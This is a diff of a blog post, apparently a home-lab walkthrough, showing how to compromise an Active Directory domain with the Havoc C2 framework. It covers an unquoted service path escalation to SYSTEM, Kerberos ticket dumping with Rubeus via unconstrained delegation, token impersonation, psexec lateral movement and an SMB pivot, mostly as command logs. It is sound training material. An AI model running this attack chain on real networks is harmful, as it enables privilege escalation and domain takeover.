@@ -305,7 +305,7 @@ In the **a.tarolli/WORKSTATION-01** demon, navigate to the vulnerable path, uplo
 [*] List Directory: .\executable.exe (67072)
 ```
 
-Before starting the service, launch a HTTP Server pointing the `demon.bin` payload where you stored using `updog` command. Updog will automatically assign port 9090 as the HTTP port. In my case, the payload is stored in `/home/havoc/Desktop/Payloads/` directory.
+Before starting the service, launch a HTTP Server (Updog) from a directory that is serving `demon.bin`. Updog will automatically assign port 9090 as the HTTP port. In my case, the payload is stored in the `/home/havoc/Desktop/Payloads/` directory.
 
 ```
 06/03/2023 16:56:59 [5pider] Demon » shell sc start "HAVOC Vulnerable Service"
@@ -325,7 +325,7 @@ SERVICE_NAME: HAVOC Vulnerable Service
         FLAGS             :
 ```
 
-Completing all the step, you should get a `SYSTEM` demon after starting the **"HAVOC Vulnerable Service"**.
+Completing all the step, you should get a `SYSTEM` demon after starting **"HAVOC Vulnerable Service"**.
 
 ```
 06/03/2023 17:12:25 [5pider] Demon » token getuid
@@ -334,24 +334,24 @@ Completing all the step, you should get a `SYSTEM` demon after starting the **"H
 [+] Token User: NT AUTHORITY\SYSTEM (Admin)
 ```
 
-At this point, the first flag can be retrieved. Here is a video walkthrough regarding launching Unquoted Service Path attack.
+At this point, the first flag can be retrieved. Here is a video walkthrough covering Unquoted Service Path attack.
 
 {% include video id="TyFHmhjm5ig" provider="youtube" %}
 
-> In the video, you will see another demon is spawned using `shellcode inject x64 <pid> <local/path>`. This is used for get a stable demon if the first demon is dead. This operation is optional.
+> In the video, you might that an extra beacon is spawned in using `shellcode inject x64 <pid> <local/path>`. This is used for get a stable demon if the first demon is dead. This operation is optional.
 
 ### 💠 Kerberoasting
 Delegation allows a user or machine to act on behalf of another user to another service.  A common implementation of this is where a user authenticates to a front-end web application that serves a back-end database. The front-end application needs to authenticate to the back-end database (using Kerberos) as the authenticated user.
 
 ![image](https://user-images.githubusercontent.com/107750005/223048931-fb1b0686-6abe-4130-bd27-122cd436f4af.png)
 
-**Unconstrained delegation** is a feature that a Domain Administrator can set to any Computer inside the domain. Then, anytime a user logins onto the Computer, a copy of the TGT of that user is going to be sent inside the TGS provided by the DC and saved in memory in LSASS. So, if you have **Administrator privileges** on the machine, you will be able to dump the tickets and impersonate the users on any machine.
+**Unconstrained delegation** is a feature that can be configured to any Computers inside the domain. Anytime a user logins onto the Computer, a copy of the TGT of that user is going to be sent inside the TGS provided by the DC and saved inside the memory of LSASS. So, if you have **Administrator privileges** on the machine, you will be able to dump the tickets and impersonate the users on any machine.
 
-THerefore, if a domain admin logins inside a computer with **"Unconstrained Delegation"** feature activated, and you have **local admin privileges** inside that machine, you will be able to dump the ticket and impersonate the Domain Admin anywhere (Domain Privilege Escalation).
+THerefore, if a domain admin logins to a computer with **"Unconstrained Delegation"** enabled, and you have **local admin privileges** on that machine, you will be able to dump the ticket and impersonate the Domain Admin to access any other machines (Domain Privilege Escalation).
 
-In our case, we had already retrieved a `SYSTEM` account which count as a high integrity demon. Therefore, we are able to launch this attack if `m.seitz` had login into **WORKSTATION-01** before. We want the user `m.seitz` is because he is local administrator in **WORKSTATION-02**.
+Using our High Integrity session as `SYSTEM`, we are able to verify whether the user `m.seitz` has an active logon session on **WORKSTATION-01**. `m.seitz` is our point of interest since he is a local administrator on **WORKSTATION-02**.
 
-First, we can check our permission before impersonating `m.seitz` by listing the directory of **WORKSTATION-02** in `SYSTEM` demon. You are expected to get a permission error.
+First, we can check our permission before impersonating `m.seitz` by listing the directory of **WORKSTATION-02** from the `SYSTEM` demon. You are expected to get a permission error.
 
 ```
 06/03/2023 15:15:39 [5pider] Demon » dir \\WORKSTATION-02.havoc.local\C$
@@ -360,9 +360,9 @@ First, we can check our permission before impersonating `m.seitz` by listing the
 [!] Win32 Error: ERROR_ACCESS_DENIED [5]
 ```
 
-For enumeration, [`ADSearch.exe`](https://github.com/tomcarver16/ADSearch) has fewer built-in searches compared to PowerView and SharpView, but it does allow you to specify custom Lightweight Directory Access Protocol (LDAP) searches. These can be used to identify entries in the directory that match a given criteria.
+For enumeration, [`ADSearch.exe`](https://github.com/tomcarver16/ADSearch) has fewer built-in searches compared to PowerView and SharpView, but it does allow you to specify custom Lightweight Directory Access Protocol (LDAP) searches. These features altogether can be used to identify entries in the directory that match a given criteria.
 
-This query will return all computers that are permitted for unconstrained delegation.
+This query will return all computers that have unconstrained delegation configured.
 
 ```
 06/03/2023 15:40:29 [5pider] Demon » dotnet inline-execute /home/havoc/Desktop/Tools/ADSearch/ADSearch/bin/Debug/ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
@@ -393,11 +393,11 @@ GitHub: @tomcarver16
 	[+] operatingsystem : Windows 11 Pro
 ```
 
-> The argument `userAccountControl:1.2.840.113556.1.4.803:=524288` in `ADSearch.exe` is the representation for searching unconstrained delegation objects.
+> The argument `userAccountControl:1.2.840.113556.1.4.803:=524288` in `ADSearch.exe` is the representation of searching for unconstrained delegation objects.
 
-[`SharpView.exe`](https://github.com/tevora-threat/SharpView) is another tool for domain enumeration and it was designed to be a C# port of PowerView. Therefore, it has much the same functionality. However, one downside is that it doesn't have the same piping ability as PowerShell.
+[`SharpView.exe`](https://github.com/tevora-threat/SharpView) is another tool for domain enumeration and it was designed to be a C# port of PowerView. Therefore, it has pretty much the same functionality. However, one downside is that it doesn't have the same piping ability as PowerShell.
 
-This query will also return all computers that are permitted for unconstrained delegation.
+This query will also return all computers that are misconfigured with unconstrained delegation.
 
 ```
 06/03/2023 15:41:45 [5pider] Demon » dotnet inline-execute /home/havoc/Desktop/Tools/SharpView/SharpView/bin/Debug/SharpView.exe Get-NetComputer -Unconstrained
@@ -447,7 +447,7 @@ dscorepropagationdata          : 1/1/1601 12:00:00 AM
 msds-supportedencryptiontypes  : 28
 ```
 
-After knowing **WORKSTATION-02** are set under unconstrained delegation, [`Rubeus.exe`](https://github.com/GhostPack/Rubeus) will be heavily utilized in this section, especially kerberos topics. By extracting and harvesting the kerberos tickets, use `Rubeus.exe triage` to grab all current tickets contains parameters such as login ID (LUID), domain username, services, and end time.
+For exploitation, [`Rubeus.exe`](https://github.com/GhostPack/Rubeus) will be used to extract and harvests the kerberos tickets. Use `Rubeus.exe triage` to grab all active tickets containing parameters such as login ID (LUID), domain username, services, and end time.
 
 ```
 06/03/2023 15:31:18 [5pider] Demon » dotnet inline-execute /home/havoc/Desktop/Tools/Rubeus/Rubeus/bin/Debug/Rubeus.exe triage
@@ -469,9 +469,9 @@ Action: Triage Kerberos Tickets (All Users)
  | 0x1eda980 | m.seitz @ HAVOC.LOCAL         | ldap/DC01.havoc.local             | 6/3/2023 7:02:06 AM  |
 ```
 
-> **WORKSTATION-01** was configured that `m.seitz` has login record. Try login again with `m.seitz` in **WORKSTATION-01** if LUID of `m.seitz` is not existed.
+> **WORKSTATION-01** is configured specifically so that `m.seitz` will always have an active logon session on the computer. Try login again with `m.seitz` in **WORKSTATION-01** if LUID of `m.seitz` does not exists for you.
 
-As mentioned above, we want accounts such as `m.seitz`, or Domain Admins even better to move laterally to **WORKSTATION-02**. Copy the LUID of `m.seitz` and dump or extract out the TGTs.
+As mentioned above, we want high-values domain users such as `m.seitz`, or Domain Admins to move laterally into **WORKSTATION-02**. Copy the LUID of `m.seitz` and dump the TGTs.
 
 ```
 06/03/2023 15:34:11 [5pider] Demon » dotnet inline-execute /home/havoc/Desktop/Tools/Rubeus/Rubeus/bin/Debug/Rubeus.exe dump /luid:0x1eda980 /nowrap
@@ -513,7 +513,7 @@ Action: Dump Kerberos Ticket Data (All Users)
       doIFejCC[...]TE9DQUw=
 ```
 
-After extracting the TGT, we can leverage it via a new logon session by using `Rubeus.exe createnetonly`. The `/password` parameter can be anything as long as the `/domain`, `/username`, and `/ticket` parameters are correct.
+After extracting the TGT, we can leverage it to a new logon session by using `Rubeus.exe createnetonly`. The `/password` parameter can be anything as long as the `/domain`, `/username`, and `/ticket` parameters are correct.
 
 ```
 06/03/2023 15:36:21 [5pider] Demon » dotnet inline-execute /home/havoc/Desktop/Tools/Rubeus/Rubeus/bin/Debug/Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:HAVOC /username:m.seitz /password:FakePass /ticket:doIFejCC[...]TE9DQUw=
@@ -538,11 +538,11 @@ After extracting the TGT, we can leverage it via a new logon session by using `R
 [+] LUID            : 0x2f60ba7
 ```
 
-Rubeus creates a new process with incorrect credentials with a new Process ID generated. Next, we need to steal the newly created process. In Cobalt Strike, red team operators just only require to `steal token 4160` in order to perform directory listing. While in Havoc Framework, an additional impersonation needs to be done after stealing the token (a.k.a. ProcessID). To steal the token, the syntax is `token steal [ProcessID]`.
+Rubeus creates a new process with an incorrect credentials, along with a newly generated Process ID (PID). Next, we need to steal the token of the newly created process. To steal the process token, the syntax will be `token steal [ProcessID]`.
 
-By typing `token list`, you can observe the token vault. Any token stole or made by operators will be stored in the token vault.
+By typing `token list`, you can list out all the stolen tokens from the token vault.
 
-To impersonate another user, the syntax is `token impersonate [Token ID]`. The Token ID can be found in the token vault.
+To impersonate a token, the syntax is `token impersonate [Token ID]`. The Token ID can be found in the token vault.
 
 ```
 06/03/2023 15:37:40 [5pider] Demon » token steal 4160
@@ -565,7 +565,7 @@ To impersonate another user, the syntax is `token impersonate [Token ID]`. The T
 [+] Successful impersonated 
 ```
 
-After token impersonation, list the directory in WORKSTATION-02. When you are able to list out the directory in another machine, you can retrieve the flag out at this point.
+After token impersonation, list the directory in WORKSTATION-02. When you are able to list out the directory in another machine, you can retrieve the flag out at this stage.
 
 ```
 05/03/2023 23:17:22 [5pider] Demon » dir \\WORKSTATION-02.havoc.local\C$
@@ -592,12 +592,12 @@ After token impersonation, list the directory in WORKSTATION-02. When you are ab
               dir      05/03/2023 24:15:23   Windows 
 ```
 
-Here is the video walkthrough regarding Unconstrained Delegation attack.
+Here is the video walkthrough covering Unconstrained Delegation vulnerability.
 
 {% include video id="sHB_REMIJNQ" provider="youtube" %}
 
 ### ⏫ Lateral Movement
-At the end of this section, you will also able to get a demon callback from WORKSTATION-02 in WORKSTATION-01 using Server Message Block (SMB) pivot connect.
+At the end of this section, you will also able to get a demon callback from WORKSTATION-02 using Server Message Block (SMB) pivot connect from WORKSTATION-01.
 
 ![image](https://user-images.githubusercontent.com/107750005/222970318-730d3947-bbf5-489e-8e18-38ec3b9f98da.png)
 
@@ -619,11 +619,11 @@ The most convenient is to use the built-in `jump-exec psexec` command - the synt
   psexec                    executes specified service on target host
 ```
 
-Create another listener with SMB protocol selected and generate a service binary ( `Windows Service EXE` ) using that listener.
+Create another listener with SMB protocol selected and generate a new service binary ( `Windows Service EXE` ) using that listener.
 
-The `jump-exec psexec` command work by uploading a service binary to the target system, then creating and starting a Windows service to execute that binary. Similar as Cobalt Strike, Demons executed this way run as `SYSTEM` instead of user accounts. After launching the command, Havoc will start the service executable automatically in the remote target.
+The `jump-exec psexec` command work by uploading a service binary to the target system, then creating and starting a Windows service to execute that binary. Similar as Cobalt Strike, Demons executed using this method will always return a demon callback under the context of `SYSTEM` instead of user accounts due to the involvement of Service Control Manager. After launching the command, Havoc will start the service executable automatically in the remote target.
 
-> Take note that, the `[Service Name]` in the `jump-exec psexec` command must insert **DemonSvc** as the Service Name when generating the service binary is `DemonSvc` by default. Additionally, do not change the default name of the service binary as it might not work with some reasons.
+> Take note that, the `[Service Name]` from the `jump-exec psexec` command must be **DemonSvc** when generating the service binary, as it is the default name. Additionally, do not change the default name of the service binary as it might not work for some unknown reasons.
 
 ```
 05/03/2023 23:20:57 [5pider] Demon » jump-exec psexec WORKSTATION-02 DemonSvc /home/havoc/Desktop/Payloads/demon_svc.exe
@@ -636,7 +636,7 @@ The `jump-exec psexec` command work by uploading a service binary to the target 
 [+] psexec successful executed on WORKSTATION-02
 ```
 
-Lastly, link the WORKSTATION-02 to WORKSTATION-01 with `pivot connect` module. The syntax is `pivot connect [COMPUTER] [pipe name]`. You are able to read the flag if you have not retrieved the flag in the previous section.
+Lastly, link the WORKSTATION-02 to WORKSTATION-01 with `pivot connect` module. The syntax is `pivot connect [COMPUTER] [pipe name]`. You can now retrieve the flag if you have not do so in the previous section.
 
 ```
 05/03/2023 23:22:20 [5pider] Demon » pivot connect WORKSTATION-02 smbpipe
@@ -644,14 +644,14 @@ Lastly, link the WORKSTATION-02 to WORKSTATION-01 with `pivot connect` module. T
 [+] [SMB] Connected to pivot agent [31ea884a]---[7436745a]
 ```
 
-Here is the video walkthrough regarding Lateral Movement using default lateral movement module in Havoc Framework.
+Here is the video walkthrough to demonstrate Lateral Movement in Havoc Framework.
 
 {% include video id="4gy-3BAiQmY" provider="youtube" %}
 
 ### ⛓️ Pivoting
-Due to the maturity and stability of Havoc Framework, pivoting attacks such as NTLM Relaying, SSH Tunneling, autorouting, etc. are relatively difficult to operate. However, here is a simple way of getting the final flag out using **token impersonation** method. (Assume that you somehow successfully retrieve the password of one of the Domain Admins.)
+Due to the current state of Havoc Framework, many pivoting attacks such as NTLM Relaying, SSH Tunneling, autorouting, etc. are relatively difficult to operate and unstable. However, here is a simple way of getting the final flag using **token impersonation** method. (Assuming that you somehow successfully retrieve the password of any Domain Admins.)
 
-In WORKSTATION-01 or WORKSTATION-02 demon, type the following commands to retrieve the final flag without logging in the Domain Controller user interface. 
+From the demon of WORKSTATION-01 or WORKSTATION-02, type the following commands to retrieve the final flag without logging in the Domain Controller via user interface. 
 
 ```
 06/03/2023 15:15:39 [5pider] Demon » dir \\DC01.havoc.local\C$
@@ -723,17 +723,15 @@ In WORKSTATION-01 or WORKSTATION-02 demon, type the following commands to retrie
 HAVOC{c7394fc9e54b0e362b5a610e0ef6a3e0}
 ```
 
-Here is a great blog by Rastamouse discuss about [NTLM Relaying via Cobalt Strike](https://rastamouse.me/ntlm-relaying-via-cobalt-strike/). We will continue update this section if any method available without knowing the credentials of Domain Admins.
+For additional references, here is a great blog by Rastamouse discussing about [NTLM Relaying via Cobalt Strike](https://rastamouse.me/ntlm-relaying-via-cobalt-strike/). We will continue to update this section if any method that allows us to pivot without knowing the credentials of Domain Admins are made publicly available.
 
-With NTLM Relaying applied, the whole compromise process should be look such as the figure below (but we unable to do it). This figure below is referenced from the [youtube video demonstration](https://www.youtube.com/watch?v=a8ghTH_fT_o&t=8s&ab_channel=5pider) by [C5pider](https://github.com/Cracked5pider).
+With NTLM Relaying applied, the whole compromise process should look something similar to the figure below. The figure below is taken from the [youtube video demonstration](https://www.youtube.com/watch?v=a8ghTH_fT_o&t=8s&ab_channel=5pider) by [C5pider](https://github.com/Cracked5pider).
 
 ![image](https://user-images.githubusercontent.com/107750005/223200209-43e2ea67-b5aa-478d-8067-fcd4a9016ca9.png)
 ![image](https://user-images.githubusercontent.com/107750005/223196736-da6a9aac-b6ff-479b-8b27-b5fc9f8d89e5.png)
 
 ## 🗣️ Conclusion
-Throughout this blog, we had covered a short introduction about what is Active Directory and a little sneak peak about Kerberos authentication. Then, we ensure that our AD lab environment is totally functional by doing some network verifications before diving into the fun stuffs. Moreover, we have gone through how attackers can bypass Windows AV and get a callback host by utilizing HAVOC framework. Besides that, one example attack in each stage had been discussed including ***unquoted service paths***, ***unconstrained delegation***, and ***pivoting attacks***. and eventually compromise the whole domain.
-
-In conclusion, I hope this article is detailed enough to benefit people for learning interesting topics and apply these gains to related work such as education, certification exams, projects, home lab practice, and more. (but not for illegal actions 💀 plzzz...) Happy Hacking!
+I hope that this article is detailed enough to benefit people to learn interesting topics and apply these knowledge to related work such as education, certification exams, projects, home lab practice, and more. (but not for illegal actions 💀 plzzz...) Happy Hacking!
 
 ## 🟦 References
 
